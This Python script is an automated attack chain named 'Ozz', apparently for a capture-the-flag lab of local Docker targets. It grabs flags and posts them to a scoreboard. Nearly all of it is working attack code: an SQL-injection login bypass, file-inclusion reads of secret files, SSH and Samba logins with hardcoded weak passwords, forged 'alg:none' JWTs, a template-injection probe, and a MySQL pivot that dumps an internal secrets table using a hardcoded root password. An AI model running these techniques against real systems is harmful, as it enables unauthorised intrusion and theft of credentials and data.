"""
OZZ — Attack Chain: Captura todas as 5 flags contra targets reais
Uso: python attack.py [--scoreboard http://localhost:9090] [--verbose]
"""

import requests
import json
import sys
import time
import base64
import subprocess
import argparse
from typing import Optional

# Colors for terminal
class C:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def banner():
    print(f"""{C.GREEN}{C.BOLD}
  ╔══════════════════════════════════════════════╗
  ║  🏴 OZZ — FULL ATTACK CHAIN                  ║
  ║  Capturing all 5 flags                       ║
  ╚══════════════════════════════════════════════╝
{C.END}""")

class Scoreboard:
    def __init__(self, url: str):
        self.url = url

    def submit(self, flag: str, agent: str = "Ozz") -> bool:
        try:
            r = requests.post(f"{self.url}/submit",
                data={"flag": flag, "agent": agent}, timeout=5)
            return True
        except:
            return False

    def get_flags(self) -> dict:
        try:
            r = requests.get(f"{self.url}/api/flags", timeout=5)
            return r.json()
        except:
            return {}

def submit_flag(sb: Scoreboard, flag: str, source: str, count: list):
    print(f"  {C.GREEN}🚩 FLAG: {flag}{C.END}")
    print(f"  {C.CYAN}📤 Submitting to scoreboard...{C.END}")
    sb.submit(flag)
    count[0] += 1
    print(f"  {C.GREEN}✅ Submitted ({count[0]}/5){C.END}\n")

def attack_target01(sb: Scoreboard, flags: list, verbose: bool = False):
    print(f"{C.YELLOW}{C.BOLD}━━━ TARGET-01: Web Server (localhost:8081) ━━━{C.END}")
    print(f"{C.YELLOW}  Vulns: SQLi, LFI{C.END}\n")

    # Step 1: SQLi
    print(f"{C.CYAN}[1/4] SQLi — Login bypass as admin...{C.END}")
    try:
        r = requests.post("http://localhost:8081/?page=login",
            data={"username": "admin'--", "password": "***"}, timeout=10)
        if "admin" in r.text.lower() or "welcome" in r.text.lower():
            print(f"  {C.GREEN}✅ SQLi successful — logged in as admin{C.END}")
        else:
            print(f"  {C.YELLOW}⚠️ Response: {r.text[:100]}{C.END}")
    except Exception as e:
        print(f"  {C.RED}❌ Connection failed: {e}{C.END}")
        return

    # Step 2: Extract secrets
    print(f"{C.CYAN}[2/4] Extracting secrets from admin dashboard...{C.END}")
    try:
        r = requests.get("http://localhost:8081/?page=dashboard&action=view_secrets", timeout=10)
        if verbose:
            print(f"  {C.GREEN}📋 {r.text[:200]}{C.END}")
        if "db_password" in r.text or "MySQL" in r.text:
            print(f"  {C.GREEN}📋 Database credentials found{C.END}")
    except:
        pass

    # Step 3: LFI for flag
    print(f"{C.CYAN}[3/4] LFI — Reading flag file...{C.END}")
    try:
        r = requests.get("http://localhost:8081/?page=reports&file=/var/secret/flag.txt", timeout=10)
        import re
        match = re.search(r'flag\{[^}]+\}', r.text)
        if match:
            submit_flag(sb, match.group(), "TARGET-01 LFI", flags)
        else:
            print(f"  {C.RED}❌ Flag not found. Raw: {r.text[:100]}{C.END}")
    except Exception as e:
        print(f"  {C.RED}❌ LFI failed: {e}{C.END}")

    # Step 4: Debug page
    print(f"{C.CYAN}[4/4] Checking debug page...{C.END}")
    try:
        r = requests.get("http://localhost:8081/?page=debug", timeout=10)
        if "DB_PASSWORD" in r.text or "config" in r.text.lower():
            print(f"  {C.GREEN}📋 Debug page exposed — more credentials{C.END}")
    except:
        pass
    print()

def attack_target02(sb: Scoreboard, flags: list, verbose: bool = False):
    print(f"{C.YELLOW}{C.BOLD}━━━ TARGET-02: SSH + Samba (localhost:2222) ━━━{C.END}")
    print(f"{C.YELLOW}  Vulns: Weak credentials, Samba share{C.END}\n")

    # Try SSH via sshpass
    print(f"{C.CYAN}[1/3] SSH — Trying admin:password123...{C.END}")
    try:
        result = subprocess.run(
            ["sshpass", "-p", "password123", "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=5",
             "-p", "2222", "admin@localhost",
             "cat /home/admin/flag.txt 2>/dev/null"],
            capture_output=True, text=True, timeout=15)
        import re
        match = re.search(r'flag\{[^}]+\}', result.stdout)
        if match:
            submit_flag(sb, match.group(), "TARGET-02 SSH", flags)
        else:
            print(f"  {C.YELLOW}⚠️ SSH: {result.stdout[:100] or 'no output'}{C.END}")
    except FileNotFoundError:
        print(f"  {C.YELLOW}⚠️ sshpass not installed. Trying Samba instead.{C.END}")
    except Exception as e:
        print(f"  {C.YELLOW}⚠️ SSH failed: {e}{C.END}")

    # Try Samba
    print(f"{C.CYAN}[2/3] Samba — Accessing admin share...{C.END}")
    try:
        result = subprocess.run(
            ["smbclient", "//localhost/admin", "-U", "admin%password123",
             "-p", "4455", "-c", "get secret.txt /tmp/smb_flag.txt"],
            capture_output=True, text=True, timeout=10)
        try:
            with open("/tmp/smb_flag.txt") as f:
                content = f.read()
            import re
            match = re.search(r'flag\{[^}]+\}', content)
            if match and match.group() not in [f for f in flags]:
                submit_flag(sb, match.group(), "TARGET-02 Samba", flags)
        except:
            pass
    except FileNotFoundError:
        print(f"  {C.YELLOW}⚠️ smbclient not installed{C.END}")
    except:
        pass

    # Config file via SSH
    print(f"{C.CYAN}[3/3] Reading config.ini for MySQL credentials...{C.END}")
    try:
        result = subprocess.run(
            ["sshpass", "-p", "password123", "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=5",
             "-p", "2222", "admin@localhost",
             "cat /opt/config.ini 2>/dev/null"],
            capture_output=True, text=True, timeout=15)
        if "mysql" in result.stdout.lower() or "password" in result.stdout.lower():
            print(f"  {C.GREEN}📋 MySQL credentials found in config{C.END}")
            if verbose:
                for line in result.stdout.strip().split('\n'):
                    if any(k in line.lower() for k in ['host', 'user', 'pass']):
                        print(f"    {line.strip()}")
    except:
        pass
    print()

def attack_target03(sb: Scoreboard, flags: list, verbose: bool = False):
    print(f"{C.YELLOW}{C.BOLD}━━━ TARGET-03: Flask API (localhost:5000) ━━━{C.END}")
    print(f"{C.YELLOW}  Vulns: SSTI, JWT algorithm confusion{C.END}\n")

    # Step 1: API discovery
    print(f"{C.CYAN}[1/5] API discovery...{C.END}")
    try:
        r = requests.get("http://localhost:5000/", timeout=10)
        data = r.json()
        print(f"  {C.GREEN}📋 Service: {data.get('service', 'unknown')}{C.END}")
    except:
        print(f"  {C.RED}❌ API not responding{C.END}")
        return

    # Step 2: Login
    print(f"{C.CYAN}[2/5] Login with default creds (admin/admin2026)...{C.END}")
    token = None
    try:
        r = requests.post("http://localhost:5000/auth/login",
            json={"username": "admin", "password": "admin2026"}, timeout=10)
        data = r.json()
        token = data.get("token")
        if token:
            print(f"  {C.GREEN}✅ Got JWT token: {token[:50]}...{C.END}")
    except:
        print(f"  {C.RED}❌ Login failed{C.END}")

    # Step 3: JWT bypass
    print(f"{C.CYAN}[3/5] JWT bypass — forging admin token with alg:none...{C.END}")
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).rstrip(b"=").decode()
    forged_token = f"{header}.{payload}."
    print(f"  {C.GREEN}🔑 Forged token: {forged_token[:50]}...{C.END}")

    # Step 4: Access secrets
    print(f"{C.CYAN}[4/5] Accessing /admin/secrets with forged token...{C.END}")
    for t in [forged_token, token]:
        if not t:
            continue
        try:
            r = requests.get("http://localhost:5000/admin/secrets",
                headers={"Authorization": f"Bearer {t}"}, timeout=10)
            data = r.json()
            if "flag" in data:
                import re
                match = re.search(r'flag\{[^}]+\}', json.dumps(data))
                if match:
                    submit_flag(sb, match.group(), "TARGET-03 JWT Bypass", flags)
                    break
        except:
            pass

    # Step 5: SSTI
    print(f"{C.CYAN}[5/5] SSTI — Testing template injection...{C.END}")
    try:
        r = requests.post("http://localhost:5000/render",
            json={"template": "{{7*7}}", "name": "test"}, timeout=10)
        data = r.json()
        rendered = data.get("rendered", "")
        if "49" in rendered:
            print(f"  {C.GREEN}✅ SSTI confirmed: 7*7 = 49{C.END}")
        if verbose:
            print(f"  {C.GREEN}📋 Rendered: {rendered}{C.END}")
    except:
        pass
    print()

def attack_target04(sb: Scoreboard, flags: list, verbose: bool = False):
    print(f"{C.YELLOW}{C.BOLD}━━━ TARGET-04: MySQL Internal (10.0.0.40) ━━━{C.END}")
    print(f"{C.YELLOW}  Vulns: Credential chain from all targets{C.END}\n")

    print(f"{C.CYAN}[1/2] Connecting to MySQL with gathered credentials...{C.END}")

    # Try mysql client directly
    mysql_cmd = ["mysql", "-h", "127.0.0.1", "-P", "3306", "-u", "root",
                 "-p***", "corporate",
                 "-e", "SELECT secret_key, secret_value FROM internal_secrets;"]

    # Try via docker exec first
    for container in ["target-02", "target-01"]:
        try:
            result = subprocess.run(
                ["docker", "exec", container, "mysql",
                 "-h", "10.0.0.40", "-u", "root", "-p***",
                 "-e", "USE corporate; SELECT secret_key, secret_value FROM internal_secrets;"],
                capture_output=True, text=True, timeout=30)
            if "flag" in result.stdout:
                print(f"  {C.GREEN}📋 Database dump via {container}:{C.END}")
                if verbose:
                    for line in result.stdout.strip().split('\n'):
                        if 'flag' in line.lower() or 'secret' in line.lower():
                            print(f"    {line}")
                import re
                for match in re.finditer(r'flag\{[^}]+\}', result.stdout):
                    if match.group() not in flags:
                        submit_flag(sb, match.group(), f"TARGET-04 MySQL via {container}", flags)
                return
        except:
            continue

    # Try via SSH tunnel
    print(f"{C.CYAN}[2/2] Trying MySQL via SSH tunnel...{C.END}")
    try:
        result = subprocess.run(
            ["sshpass", "-p", "password123", "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=5",
             "-p", "2222", "admin@localhost",
             "mysql -h 10.0.0.40 -u root -p'MySQL_R00t_2026!' "
             "-e 'USE corporate; SELECT secret_key, secret_value FROM internal_secrets;' 2>/dev/null"],
            capture_output=True, text=True, timeout=30)
        if "flag" in result.stdout:
            print(f"  {C.GREEN}📋 Database dump via SSH tunnel:{C.END}")
            import re
            for match in re.finditer(r'flag\{[^}]+\}', result.stdout):
                if match.group() not in flags:
                    submit_flag(sb, match.group(), "TARGET-04 MySQL via SSH", flags)
        else:
            print(f"  {C.YELLOW}⚠️ MySQL not reachable. Manual pivot needed.{C.END}")
            print(f"  {C.CYAN}Credentials: root:MySQL_R00t_2026!@10.0.0.40{C.END}")
    except:
        print(f"  {C.YELLOW}⚠️ Could not reach MySQL. Try from within Docker network.{C.END}")
    print()

def main():
    parser = argparse.ArgumentParser(description="Ozz Attack Chain")
    parser.add_argument("--scoreboard", default="http://localhost:9090", help="Scoreboard URL")
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    banner()

    sb = Scoreboard(args.scoreboard)
    flags = [0]  # mutable counter

    print(f"  {C.CYAN}📊 Scoreboard: {args.scoreboard}{C.END}")
    print(f"  {C.CYAN}🎯 Targets: 4 (Web, SSH/SMB, API, MySQL){C.END}\n")

    attack_target01(sb, flags, args.verbose)
    attack_target02(sb, flags, args.verbose)
    attack_target03(sb, flags, args.verbose)
    attack_target04(sb, flags, args.verbose)

    # Final report
    print(f"{C.GREEN}{C.BOLD}╔══════════════════════════════════════════════╗{C.END}")
    print(f"{C.GREEN}{C.BOLD}║  🏴 OZZ — ATTACK COMPLETE                    ║{C.END}")
    print(f"{C.GREEN}{C.BOLD}╚══════════════════════════════════════════════╝{C.END}")
    print(f"\n  {C.BOLD}Flags captured: {flags[0]}/5{C.END}")
    print(f"  {C.CYAN}📊 Check scoreboard: {args.scoreboard}{C.END}\n")

    # Show scoreboard status
    try:
        resp = sb.get_flags()
        if resp:
            print(f"  {C.BOLD}Scoreboard Status:{C.END}")
            for flag, info in resp.items():
                status = f"{C.GREEN}✅ FOUND{C.END}" if info.get("found") else f"{C.RED}🔒 LOCKED{C.END}"
                print(f"    {flag} → {status} ({info.get('points', 0)} pts)")
    except:
        pass

if __name__ == "__main__":
    main()
